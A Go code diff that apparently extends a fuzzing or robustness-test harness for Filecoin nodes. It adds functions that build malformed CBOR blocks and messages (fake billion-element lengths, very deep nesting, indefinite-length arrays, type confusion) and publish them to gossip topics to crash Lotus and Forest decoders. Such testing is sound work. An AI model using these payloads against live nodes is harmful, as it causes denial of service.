@@ -32,20 +32,40 @@ const oomAllocSize = 1_000_000_000 // 1 billion — triggers ~8GB+ pre-allocatio
 func getAllCBORBombAttacks() []namedAttack {
 	return []namedAttack{
 		// BlockHeader field OOM — published to /fil/blocks/ topic
-		{name: "oom/header-parents", fn: oomHeaderParents},
-		{name: "oom/header-beacon-entries", fn: oomHeaderBeaconEntries},
-		{name: "oom/header-winpost-proof", fn: oomHeaderWinpostProof},
+		{name: "blocks/all-block-with-fake-length-parents-array", fn: oomHeaderParents},
+		{name: "blocks/all-block-with-fake-length-beacon-entries", fn: oomHeaderBeaconEntries},
+		{name: "blocks/all-block-with-fake-length-winpost-proof", fn: oomHeaderWinpostProof},
 
 		// BlockMsg CID array OOM — published to /fil/blocks/ topic
-		{name: "oom/blockmsg-bls-cids", fn: oomBlockmsgBlsCids},
-		{name: "oom/blockmsg-secpk-cids", fn: oomBlockmsgSecpkCids},
+		{name: "blocks/all-blockmsg-with-fake-length-bls-cids", fn: oomBlockmsgBlsCids},
+		{name: "blocks/all-blockmsg-with-fake-length-secpk-cids", fn: oomBlockmsgSecpkCids},
 
 		// SignedMessage field OOM — published to /fil/msgs/ topic
-		{name: "oom/signedmsg-params", fn: oomSignedmsgParams},
-		{name: "oom/signedmsg-signature", fn: oomSignedmsgSignature},
+		{name: "msgs/all-signed-message-with-fake-length-params", fn: oomSignedmsgParams},
+		{name: "msgs/all-signed-message-with-fake-length-signature", fn: oomSignedmsgSignature},
 
 		// Stack exhaustion via deep nesting
-		{name: "stack/deeply-nested-cbor", fn: stackDeeplyNestedCBOR},
+		{name: "blocks/all-block-with-deeply-nested-cbor", fn: stackDeeplyNestedCBOR},
+
+		// Forest 8MB Rust stack exhaustion (deeper nesting)
+		{name: "blocks/all-block-with-deep-nested-beacon-500-2000", fn: stackForestDeepBeacon},
+		{name: "blocks/all-block-with-deep-nested-alternating-array-map", fn: stackForestDeepAlternating},
+		{name: "msgs/all-signed-message-with-deep-nested-params", fn: stackForestDeepMsgParams},
+
+		// DAG-CBOR strictness violations (Forest serde_ipld_dagcbor)
+		{name: "blocks/all-block-with-indefinite-length-array", fn: dagcborIndefiniteArrayBlock},
+		{name: "msgs/all-signed-message-with-indefinite-length-array", fn: dagcborIndefiniteArrayMsg},
+		{name: "blocks/all-block-with-noncanonical-integer-encoding", fn: dagcborNonCanonicalUintBlock},
+		{name: "msgs/all-signed-message-with-noncanonical-integer-encoding", fn: dagcborNonCanonicalUintMsg},
+
+		// CBOR type confusion attacks
+		{name: "blocks/all-block-with-cbor-map-instead-of-array", fn: typeconfMapWhereArrayBlock},
+		{name: "blocks/all-block-with-text-string-instead-of-bytes", fn: typeconfTextWhereBytesBlock},
+		{name: "blocks/all-block-with-duplicate-cbor-map-keys", fn: typeconfDuplicateMapKeysBlock},
+
+		// Additional OOM paths (text string and map headers)
+		{name: "blocks/all-block-with-fake-length-text-string", fn: oomHeaderTextString},
+		{name: "blocks/all-block-with-fake-length-map", fn: oomHeaderMapHeader},
 	}
 }
 
@@ -246,4 +266,201 @@ func stackDeeplyNestedCBOR() {
 	data := cborArray(header, cborArray(), cborArray())
 	log.Printf("[stack] deeply-nested-cbor: depth=%d, %d bytes to /fil/blocks/", depth, len(data))
 	publishBlock(data)
+}
+
+// ---------------------------------------------------------------------------
+// Forest-targeted attacks
+//
+// Forest (Rust) differs from Lotus (Go):
+//   - Thread stack: 8MB default (vs Go's dynamically-growing 1GB)
+//   - CBOR decoder: serde_ipld_dagcbor (strict DAG-CBOR) vs cbor-gen (lenient)
+//   - Indefinite-length CBOR: forbidden by DAG-CBOR but may not be validated
+//   - Non-canonical integers: DAG-CBOR requires minimal encoding
+//   - Type confusion: serde may panic on unexpected CBOR major types
+// ---------------------------------------------------------------------------
+
+// stackForestDeepBeacon: 500-2000 depth for Forest's 8MB Rust thread stack.
+// Current 100-200 depth is insufficient. Rust stack overflow at ~500+.
+func stackForestDeepBeacon() {
+	depth := 500 + rngIntn(1500)
+	inner := cborUint64(42)
+	for i := 0; i < depth; i++ {
+		inner = cborArray(inner)
+	}
+	fields := buildDefaultHeaderFields()
+	fields[3] = inner
+	header := cborArray(fields...)
+	data := cborArray(header, cborArray(), cborArray())
+	log.Printf("[stack-forest] deep-beacon: depth=%d, %d bytes to /fil/blocks/", depth, len(data))
+	publishBlock(data)
+}
+
+// stackForestDeepAlternating: Alternating array→map→array nesting.
+// Exercises different Rust serde recursion paths (visit_seq vs visit_map).
+func stackForestDeepAlternating() {
+	depth := 500 + rngIntn(1500)
+	inner := cborUint64(42)
+	for i := 0; i < depth; i++ {
+		if i%2 == 0 {
+			inner = cborArray(inner)
+		} else {
+			inner = cborMap(cborUint64(0), inner)
+		}
+	}
+	fields := buildDefaultHeaderFields()
+	fields[3] = inner
+	header := cborArray(fields...)
+	data := cborArray(header, cborArray(), cborArray())
+	log.Printf("[stack-forest] deep-alternating: depth=%d, %d bytes to /fil/blocks/", depth, len(data))
+	publishBlock(data)
+}
+
+// stackForestDeepMsgParams: Deep nesting in SignedMessage Params field.
+// Hits the Message decoder path (separate from BlockHeader).
+func stackForestDeepMsgParams() {
+	depth := 500 + rngIntn(1500)
+	inner := cborUint64(42)
+	for i := 0; i < depth; i++ {
+		inner = cborArray(inner)
+	}
+	validAddr := cborBytes([]byte{0x00, 0xe8, 0x07})
+	msg := cborArray(
+		cborUint64(0), validAddr, validAddr, cborUint64(0),
+		cborBytes(bigIntBytes(0)), cborInt64(1000000),
+		cborBytes(bigIntBytes(100)), cborBytes(bigIntBytes(100)),
+		cborUint64(0), inner,
+	)
+	sig := cborBytes(append([]byte{0x01}, randomBytes(65)...))
+	data := cborArray(msg, sig)
+	log.Printf("[stack-forest] deep-msg-params: depth=%d, %d bytes to /fil/msgs/", depth, len(data))
+	publishMsg(data)
+}
+
+// dagcborIndefiniteArrayBlock: Block with indefinite-length CBOR array (0x9F...0xFF).
+// DAG-CBOR forbids indefinite-length. If Forest's decoder doesn't reject,
+// it may process data differently or panic on break codes.
+func dagcborIndefiniteArrayBlock() {
+	fields := buildDefaultHeaderFields()
+	fields[3] = cborIndefiniteArray() // BeaconEntries as indefinite-length
+	header := cborArray(fields...)
+	data := cborArray(header, cborArray(), cborArray())
+	log.Printf("[dagcbor] indefinite-array-block: %d bytes to /fil/blocks/", len(data))
+	publishBlock(data)
+}
+
+// dagcborIndefiniteArrayMsg: SignedMessage with indefinite-length inner Message array.
+func dagcborIndefiniteArrayMsg() {
+	validAddr := cborBytes([]byte{0x00, 0xe8, 0x07})
+	msg := cborIndefiniteArray(
+		cborUint64(0), validAddr, validAddr, cborUint64(0),
+		cborBytes(bigIntBytes(0)), cborInt64(1000000),
+		cborBytes(bigIntBytes(100)), cborBytes(bigIntBytes(100)),
+		cborUint64(0), cborBytes(nil),
+	)
+	sig := cborBytes(append([]byte{0x01}, randomBytes(65)...))
+	data := cborArray(msg, sig)
+	log.Printf("[dagcbor] indefinite-array-msg: %d bytes to /fil/msgs/", len(data))
+	publishMsg(data)
+}
+
+// dagcborNonCanonicalUintBlock: Block with non-canonical integer encoding.
+// DAG-CBOR requires minimal encoding (0 = 1 byte). We use 9 bytes for small values.
+func dagcborNonCanonicalUintBlock() {
+	fields := buildDefaultHeaderFields()
+	fields[7] = cborNonCanonicalUint64(1)          // Height
+	fields[12] = cborNonCanonicalUint64(1700000000) // Timestamp
+	fields[14] = cborNonCanonicalUint64(0)          // ForkSignaling
+	header := cborArray(fields...)
+	data := cborArray(header, cborArray(), cborArray())
+	log.Printf("[dagcbor] noncanonical-uint-block: %d bytes to /fil/blocks/", len(data))
+	publishBlock(data)
+}
+
+// dagcborNonCanonicalUintMsg: SignedMessage with non-canonical integer encoding.
+func dagcborNonCanonicalUintMsg() {
+	validAddr := cborBytes([]byte{0x00, 0xe8, 0x07})
+	msg := cborArray(
+		cborNonCanonicalUint64(0), validAddr, validAddr,
+		cborNonCanonicalUint64(0),
+		cborBytes(bigIntBytes(0)), cborNonCanonicalUint64(1000000),
+		cborBytes(bigIntBytes(100)), cborBytes(bigIntBytes(100)),
+		cborNonCanonicalUint64(0), cborBytes(nil),
+	)
+	sig := cborBytes(append([]byte{0x01}, randomBytes(65)...))
+	data := cborArray(msg, sig)
+	log.Printf("[dagcbor] noncanonical-uint-msg: %d bytes to /fil/msgs/", len(data))
+	publishMsg(data)
+}
+
+// typeconfMapWhereArrayBlock: Block where BlockHeader is a CBOR map instead of array.
+// Decoder expects MajArray but gets MajMap — may panic on type mismatch.
+func typeconfMapWhereArrayBlock() {
+	fields := buildDefaultHeaderFields()
+	var entries [][]byte
+	for i, f := range fields {
+		entries = append(entries, cborUint64(uint64(i)), f)
+	}
+	header := cborMap(entries...)
+	data := cborArray(header, cborArray(), cborArray())
+	log.Printf("[typeconf] map-where-array-block: %d bytes to /fil/blocks/", len(data))
+	publishBlock(data)
+}
+
+// typeconfTextWhereBytesBlock: Block where byte-string fields use text-string type.
+// CBOR major type 3 (text) vs 2 (bytes). May cause type assertion panic.
+func typeconfTextWhereBytesBlock() {
+	fields := buildDefaultHeaderFields()
+	fields[0] = cborTextString(string([]byte{0x00, 0xe8, 0x07}))  // Miner
+	fields[11] = cborTextString(string([]byte{0x02}))              // BLSAggregate
+	header := cborArray(fields...)
+	data := cborArray(header, cborArray(), cborArray())
+	log.Printf("[typeconf] text-where-bytes-block: %d bytes to /fil/blocks/", len(data))
+	publishBlock(data)
+}
+
+// typeconfDuplicateMapKeysBlock: Block with CBOR map containing duplicate keys
+// where an array is expected. DAG-CBOR forbids duplicates.
+func typeconfDuplicateMapKeysBlock() {
+	dupMap := cborMap(
+		cborUint64(0), cborBytes(randomBytes(32)),
+		cborUint64(0), cborBytes(randomBytes(32)), // duplicate key
+	)
+	fields := buildDefaultHeaderFields()
+	fields[3] = dupMap // BeaconEntries
+	header := cborArray(fields...)
+	data := cborArray(header, cborArray(), cborArray())
+	log.Printf("[typeconf] duplicate-map-keys-block: %d bytes to /fil/blocks/", len(data))
+	publishBlock(data)
+}
+
+// oomHeaderTextString: OOM via text string header claiming 1B bytes.
+// Exercises the text-string allocation path (separate from byte-string).
+func oomHeaderTextString() {
+	data := buildBlockMsgWithBombedField(6, cborTextWithFakeLength(oomAllocSize))
+	log.Printf("[oom] header-text-string: %d bytes to /fil/blocks/", len(data))
+	publishBlock(data)
+}
+
+// oomHeaderMapHeader: OOM via map header claiming 1B entries.
+// Exercises the map allocation path (separate from array).
+func oomHeaderMapHeader() {
+	data := buildBlockMsgWithBombedField(3, cborMapWithFakeLength(oomAllocSize))
+	log.Printf("[oom] header-map-header: %d bytes to /fil/blocks/", len(data))
+	publishBlock(data)
+}
+
+// getAllForestAttacks returns Forest-specific vectors for the FOREST weight category.
+// These target Rust decoder differences and are published via GossipSub (nodeAny).
+func getAllForestAttacks() []namedAttack {
+	attacks := []namedAttack{
+		{name: "blocks/forest-block-with-deep-nested-beacon", fn: stackForestDeepBeacon},
+		{name: "blocks/forest-block-with-deep-nested-alternating", fn: stackForestDeepAlternating},
+		{name: "msgs/forest-signed-message-with-deep-nested-params", fn: stackForestDeepMsgParams},
+		{name: "blocks/forest-block-with-indefinite-length-array", fn: dagcborIndefiniteArrayBlock},
+		{name: "msgs/forest-signed-message-with-indefinite-length-array", fn: dagcborIndefiniteArrayMsg},
+		{name: "blocks/forest-block-with-noncanonical-integer", fn: dagcborNonCanonicalUintBlock},
+		{name: "msgs/forest-signed-message-with-noncanonical-integer", fn: dagcborNonCanonicalUintMsg},
+	}
+	attacks = append(attacks, getAllFVMAddressAttacks()...)
+	return attacks
 }
